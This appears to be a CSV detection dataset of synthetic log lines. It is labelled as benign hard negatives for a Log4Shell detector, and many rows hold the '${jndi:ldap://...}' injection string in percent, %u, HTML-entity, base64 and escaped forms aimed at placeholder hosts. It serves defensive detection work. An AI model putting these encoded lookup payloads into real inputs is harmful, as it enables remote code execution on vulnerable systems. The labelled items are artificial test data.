id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-004055,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fdefensive-lab.example%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-val-0062,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fdefensive-lab.example%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-val-0062,0,benign,benign_percent_u_documentation,mixed,val,low
LS-004056,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://docs.example/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-val-0063,security_review indicator_sample='${jndi:ldap://docs.example/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-val-0063,0,benign,benign_scanner_report,mixed,val,low
LS-004057,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://sample.invalid/sample}' render_context=documentation_only trace_id=hardneg-val-0064,info markdown_code_block value='${jndi:ldap://sample.invalid/sample}' render_context=documentation_only trace_id=hardneg-val-0064,0,benign,benign_documentation_example,mixed,val,low
LS-004058,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Fdocs.example%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-val-0065,get /kb/log4shell?sample=${jndi:ldap://docs.example/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-val-0065,0,benign,benign_encoded_documentation,mixed,val,low
LS-004059,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9kb2NzLmV4YW1wbGUvc2FtcGxlfQ== action=store_sample decode_at_runtime=false trace_id=hardneg-val-0066,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9kb2nzlmv4yw1wbguvc2ftcgxlfq== action=store_sample decode_at_runtime=false trace_id=hardneg-val-0066,0,benign,benign_base64_artifact,mixed,val,low
LS-004060,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'playbook.local' are shown separately for awareness trace_id=hardneg-val-0067,training note tokens '$' '{' 'jndi' ':ldap://' 'playbook.local' are shown separately for awareness trace_id=hardneg-val-0067,0,benign,benign_fragmented_tutorial_text,mixed,val,low
LS-004061,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;kb.internal&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-val-0068,get /preview?html=${jndi:ldap://kb.internal/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-val-0068,0,benign,benign_html_entity_documentation,mixed,val,low
LS-004062,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'sample.invalid' are shown separately for awareness trace_id=hardneg-val-0069,training note tokens '$' '{' 'jndi' ':ldap://' 'sample.invalid' are shown separately for awareness trace_id=hardneg-val-0069,0,benign,benign_fragmented_tutorial_text,mixed,val,low
LS-004063,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Fplaybook.local%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-val-0070,get /kb/log4shell?sample=${jndi:ldap://playbook.local/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-val-0070,0,benign,benign_encoded_documentation,mixed,val,low
LS-004064,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Ftraining.local%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-val-0071,get /kb/log4shell?sample=${jndi:ldap://training.local/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-val-0071,0,benign,benign_encoded_documentation,mixed,val,low
LS-004065,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fkb.internal%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-val-0072,get /docs/search?q=${jndi:ldap://kb.internal/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-val-0072,0,benign,benign_encoded_search_query,mixed,val,low
LS-004066,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://training.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-val-0073,assert literal_payload_string equals '${jndi:ldap://training.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-val-0073,0,benign,benign_unit_test_fixture,mixed,val,low
LS-004067,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'playbook.local' are shown separately for awareness trace_id=hardneg-val-0074,training note tokens '$' '{' 'jndi' ':ldap://' 'playbook.local' are shown separately for awareness trace_id=hardneg-val-0074,0,benign,benign_fragmented_tutorial_text,mixed,val,low
LS-004068,2026-05-17,hard_negative,Security scanner report mentions escaped example \${jndi:ldap://example.com/a} trace_id=hardneg-val-0075,security scanner report mentions escaped example \${jndi:ldap://example.com/a} trace_id=hardneg-val-0075,0,benign,escaped_payload,mixed,val,low
LS-004069,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://playbook.local/sample}' render_context=documentation_only trace_id=hardneg-val-0076,info markdown_code_block value='${jndi:ldap://playbook.local/sample}' render_context=documentation_only trace_id=hardneg-val-0076,0,benign,benign_documentation_example,mixed,val,low
LS-004070,2026-05-17,hard_negative,LDAP connection pool initialized for corporate directory trace_id=hardneg-val-0077,ldap connection pool initialized for corporate directory trace_id=hardneg-val-0077,0,benign,keyword_only,mixed,val,low
LS-004071,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Fdocs.example%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-val-0078,get /kb/log4shell?sample=${jndi:ldap://docs.example/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-val-0078,0,benign,benign_encoded_documentation,mixed,val,low
LS-004072,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://playbook.local/sample}' render_context=documentation_only trace_id=hardneg-val-0079,info markdown_code_block value='${jndi:ldap://playbook.local/sample}' render_context=documentation_only trace_id=hardneg-val-0079,0,benign,benign_documentation_example,mixed,val,low
LS-004073,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://sample.invalid/escaped}' source=developer_guide trace_id=hardneg-val-0080,info escaped_code_sample value='\${jndi:ldap://sample.invalid/escaped}' source=developer_guide trace_id=hardneg-val-0080,0,benign,benign_json_escaped_payload,mixed,val,low
LS-004074,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-val-0081","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-val-0081",0,benign,benign_keyword_only,mixed,val,low
LS-004075,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://sample.invalid/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-val-0082,security_review indicator_sample='${jndi:ldap://sample.invalid/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-val-0082,0,benign,benign_scanner_report,mixed,val,low
LS-004076,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://training.local/escaped}' source=developer_guide trace_id=hardneg-val-0083,info escaped_code_sample value='\${jndi:ldap://training.local/escaped}' source=developer_guide trace_id=hardneg-val-0083,0,benign,benign_json_escaped_payload,mixed,val,low
LS-004077,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://sample.invalid/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-val-0084,assert literal_payload_string equals '${jndi:ldap://sample.invalid/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-val-0084,0,benign,benign_unit_test_fixture,mixed,val,low
LS-004078,2026-05-17,hard_negative,Developer opened Java Naming and Directory Interface documentation trace_id=hardneg-val-0085,developer opened java naming and directory interface documentation trace_id=hardneg-val-0085,0,benign,documentation,mixed,val,low
LS-004079,2026-05-17,hard_negative,User searched for Log4j mitigation guide trace_id=hardneg-val-0086,user searched for log4j mitigation guide trace_id=hardneg-val-0086,0,benign,keyword_only,mixed,val,low
LS-004080,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fkb.internal%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-val-0087,get /docs/search?q=${jndi:ldap://kb.internal/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-val-0087,0,benign,benign_encoded_search_query,mixed,val,low
LS-004081,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://docs.example/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-val-0088,assert literal_payload_string equals '${jndi:ldap://docs.example/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-val-0088,0,benign,benign_unit_test_fixture,mixed,val,low
LS-004082,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;docs.example&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-val-0089,get /preview?html=${jndi:ldap://docs.example/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-val-0089,0,benign,benign_html_entity_documentation,mixed,val,low
LS-004083,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;kb.internal&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-val-0090,get /preview?html=${jndi:ldap://kb.internal/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-val-0090,0,benign,benign_html_entity_documentation,mixed,val,low
LS-004084,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://playbook.local/sample}' render_context=documentation_only trace_id=hardneg-val-0091,info markdown_code_block value='${jndi:ldap://playbook.local/sample}' render_context=documentation_only trace_id=hardneg-val-0091,0,benign,benign_documentation_example,mixed,val,low
LS-004085,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://playbook.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-val-0092,assert literal_payload_string equals '${jndi:ldap://playbook.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-val-0092,0,benign,benign_unit_test_fixture,mixed,val,low
LS-004086,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://playbook.local/sample}' render_context=documentation_only trace_id=hardneg-val-0093,info markdown_code_block value='${jndi:ldap://playbook.local/sample}' render_context=documentation_only trace_id=hardneg-val-0093,0,benign,benign_documentation_example,mixed,val,low
LS-004087,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fdocs.example%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-val-0094,get /docs/search?q=${jndi:ldap://docs.example/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-val-0094,0,benign,benign_encoded_search_query,mixed,val,low
LS-004088,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fdocs.example%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-val-0095,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fdocs.example%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-val-0095,0,benign,benign_percent_u_documentation,mixed,val,low
LS-004089,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fdefensive-lab.example%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-val-0096,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fdefensive-lab.example%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-val-0096,0,benign,benign_percent_u_documentation,mixed,val,low
LS-004090,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-val-0097","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-val-0097",0,benign,benign_keyword_only,mixed,val,low
LS-004091,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fplaybook.local%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-val-0098,get /docs/search?q=${jndi:ldap://playbook.local/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-val-0098,0,benign,benign_encoded_search_query,mixed,val,low
LS-004092,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;docs.example&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-val-0099,get /preview?html=${jndi:ldap://docs.example/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-val-0099,0,benign,benign_html_entity_documentation,mixed,val,low
LS-004093,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://playbook.local/escaped}' source=developer_guide trace_id=hardneg-val-0100,info escaped_code_sample value='\${jndi:ldap://playbook.local/escaped}' source=developer_guide trace_id=hardneg-val-0100,0,benign,benign_json_escaped_payload,mixed,val,low
LS-004094,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://kb.internal/sample}' render_context=documentation_only trace_id=hardneg-val-0101,info markdown_code_block value='${jndi:ldap://kb.internal/sample}' render_context=documentation_only trace_id=hardneg-val-0101,0,benign,benign_documentation_example,mixed,val,low
LS-004095,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Ftraining.local%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-val-0102,get /docs/search?q=${jndi:ldap://training.local/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-val-0102,0,benign,benign_encoded_search_query,mixed,val,low
LS-004096,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Ftraining.local%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-val-0103,get /kb/log4shell?sample=${jndi:ldap://training.local/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-val-0103,0,benign,benign_encoded_documentation,mixed,val,low
LS-004097,2026-05-17,hard_negative,JNDI configuration loaded successfully for internal naming service trace_id=hardneg-val-0104,jndi configuration loaded successfully for internal naming service trace_id=hardneg-val-0104,0,benign,keyword_only,mixed,val,low
LS-004098,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;defensive-lab.example&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-val-0105,get /preview?html=${jndi:ldap://defensive-lab.example/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-val-0105,0,benign,benign_html_entity_documentation,mixed,val,low
LS-004099,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://docs.example/escaped}' source=developer_guide trace_id=hardneg-val-0106,info escaped_code_sample value='\${jndi:ldap://docs.example/escaped}' source=developer_guide trace_id=hardneg-val-0106,0,benign,benign_json_escaped_payload,mixed,val,low
LS-004100,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Ftraining.local%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-val-0107,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002ftraining.local%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-val-0107,0,benign,benign_percent_u_documentation,mixed,val,low
LS-004101,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9rYi5pbnRlcm5hbC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-val-0108,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9ryi5pbnrlcm5hbc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-val-0108,0,benign,benign_base64_artifact,mixed,val,low
LS-004102,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://docs.example/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-val-0109,security_review indicator_sample='${jndi:ldap://docs.example/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-val-0109,0,benign,benign_scanner_report,mixed,val,low
LS-004103,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fdefensive-lab.example%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-val-0110,get /docs/search?q=${jndi:ldap://defensive-lab.example/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-val-0110,0,benign,benign_encoded_search_query,mixed,val,low
LS-004104,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://sample.invalid/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-val-0111,assert literal_payload_string equals '${jndi:ldap://sample.invalid/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-val-0111,0,benign,benign_unit_test_fixture,mixed,val,low
LS-004105,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Ftraining.local%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-val-0112,get /kb/log4shell?sample=${jndi:ldap://training.local/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-val-0112,0,benign,benign_encoded_documentation,mixed,val,low
LS-004106,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Fdocs.example%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-val-0113,get /kb/log4shell?sample=${jndi:ldap://docs.example/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-val-0113,0,benign,benign_encoded_documentation,mixed,val,low
LS-004107,2026-05-17,hard_negative,User searched for Log4j mitigation guide trace_id=hardneg-val-0114,user searched for log4j mitigation guide trace_id=hardneg-val-0114,0,benign,keyword_only,mixed,val,low
LS-004108,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fkb.internal%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-val-0115,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fkb.internal%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-val-0115,0,benign,benign_percent_u_documentation,mixed,val,low
LS-004109,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-val-0116","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-val-0116",0,benign,benign_keyword_only,mixed,val,low
LS-004110,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fplaybook.local%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-val-0117,get /docs/search?q=${jndi:ldap://playbook.local/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-val-0117,0,benign,benign_encoded_search_query,mixed,val,low
LS-004111,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Fsample.invalid%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-val-0118,get /kb/log4shell?sample=${jndi:ldap://sample.invalid/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-val-0118,0,benign,benign_encoded_documentation,mixed,val,low
LS-004112,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Ftraining.local%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-val-0119,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002ftraining.local%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-val-0119,0,benign,benign_percent_u_documentation,mixed,val,low
LS-004113,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://training.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-val-0120,security_review indicator_sample='${jndi:ldap://training.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-val-0120,0,benign,benign_scanner_report,mixed,val,low
LS-004114,2026-05-17,hard_negative,Developer opened Java Naming and Directory Interface documentation trace_id=hardneg-val-0121,developer opened java naming and directory interface documentation trace_id=hardneg-val-0121,0,benign,documentation,mixed,val,low
LS-004115,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fdefensive-lab.example%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-val-0122,get /docs/search?q=${jndi:ldap://defensive-lab.example/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-val-0122,0,benign,benign_encoded_search_query,mixed,val,low
LS-004116,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://training.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-val-0123,security_review indicator_sample='${jndi:ldap://training.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-val-0123,0,benign,benign_scanner_report,mixed,val,low
LS-004117,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fplaybook.local%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-val-0124,get /docs/search?q=${jndi:ldap://playbook.local/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-val-0124,0,benign,benign_encoded_search_query,mixed,val,low
LS-004118,2026-05-17,hard_negative,Blog article about Log4Shell payloads was requested trace_id=hardneg-val-0125,blog article about log4shell payloads was requested trace_id=hardneg-val-0125,0,benign,documentation,mixed,val,low
LS-004119,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://playbook.local/json}"",""literal"":true} trace_id=hardneg-val-0126","info json_template={""example"":""\\${jndi:ldap://playbook.local/json}"",""literal"":true} trace_id=hardneg-val-0126",0,benign,benign_json_escaped_payload,mixed,val,low
LS-004120,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9kb2NzLmV4YW1wbGUvc2FtcGxlfQ== action=store_sample decode_at_runtime=false trace_id=hardneg-val-0127,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9kb2nzlmv4yw1wbguvc2ftcgxlfq== action=store_sample decode_at_runtime=false trace_id=hardneg-val-0127,0,benign,benign_base64_artifact,mixed,val,low
LS-004121,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9zYW1wbGUuaW52YWxpZC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-val-0128,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9zyw1wbguuaw52ywxpzc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-val-0128,0,benign,benign_base64_artifact,mixed,val,low
LS-004122,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://kb.internal/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-val-0129,security_review indicator_sample='${jndi:ldap://kb.internal/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-val-0129,0,benign,benign_scanner_report,mixed,val,low
LS-004123,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fplaybook.local%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-val-0130,get /docs/search?q=${jndi:ldap://playbook.local/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-val-0130,0,benign,benign_encoded_search_query,mixed,val,low
LS-004124,2026-05-17,hard_negative,Blog article about Log4Shell payloads was requested trace_id=hardneg-val-0131,blog article about log4shell payloads was requested trace_id=hardneg-val-0131,0,benign,documentation,mixed,val,low
LS-004125,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'defensive-lab.example' are shown separately for awareness trace_id=hardneg-val-0132,training note tokens '$' '{' 'jndi' ':ldap://' 'defensive-lab.example' are shown separately for awareness trace_id=hardneg-val-0132,0,benign,benign_fragmented_tutorial_text,mixed,val,low
LS-004126,2026-05-17,hard_negative,GET /docs/log4j-mitigation HTTP/1.1 trace_id=hardneg-val-0133,get /docs/log4j-mitigation http/1.1 trace_id=hardneg-val-0133,0,benign,documentation,mixed,val,low
LS-004127,2026-05-17,hard_negative,Blog article about Log4Shell payloads was requested trace_id=hardneg-val-0134,blog article about log4shell payloads was requested trace_id=hardneg-val-0134,0,benign,documentation,mixed,val,low
LS-004128,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://sample.invalid/escaped}' source=developer_guide trace_id=hardneg-val-0135,info escaped_code_sample value='\${jndi:ldap://sample.invalid/escaped}' source=developer_guide trace_id=hardneg-val-0135,0,benign,benign_json_escaped_payload,mixed,val,low
LS-004129,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly90cmFpbmluZy5sb2NhbC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-val-0136,debug artifact payload_b64=jhtqbmrpomxkyxa6ly90cmfpbmluzy5sb2nhbc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-val-0136,0,benign,benign_base64_artifact,mixed,val,low
LS-004130,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-val-0137","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-val-0137",0,benign,benign_keyword_only,mixed,val,low
LS-004131,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://sample.invalid/sample}' render_context=documentation_only trace_id=hardneg-val-0138,info markdown_code_block value='${jndi:ldap://sample.invalid/sample}' render_context=documentation_only trace_id=hardneg-val-0138,0,benign,benign_documentation_example,mixed,val,low
LS-004132,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://training.local/json}"",""literal"":true} trace_id=hardneg-val-0139","info json_template={""example"":""\\${jndi:ldap://training.local/json}"",""literal"":true} trace_id=hardneg-val-0139",0,benign,benign_json_escaped_payload,mixed,val,low
LS-004133,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly90cmFpbmluZy5sb2NhbC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-val-0140,debug artifact payload_b64=jhtqbmrpomxkyxa6ly90cmfpbmluzy5sb2nhbc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-val-0140,0,benign,benign_base64_artifact,mixed,val,low
LS-004134,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://docs.example/sample}' render_context=documentation_only trace_id=hardneg-val-0141,info markdown_code_block value='${jndi:ldap://docs.example/sample}' render_context=documentation_only trace_id=hardneg-val-0141,0,benign,benign_documentation_example,mixed,val,low
LS-004135,2026-05-17,hard_negative,JNDI configuration loaded successfully for internal naming service trace_id=hardneg-val-0142,jndi configuration loaded successfully for internal naming service trace_id=hardneg-val-0142,0,benign,keyword_only,mixed,val,low
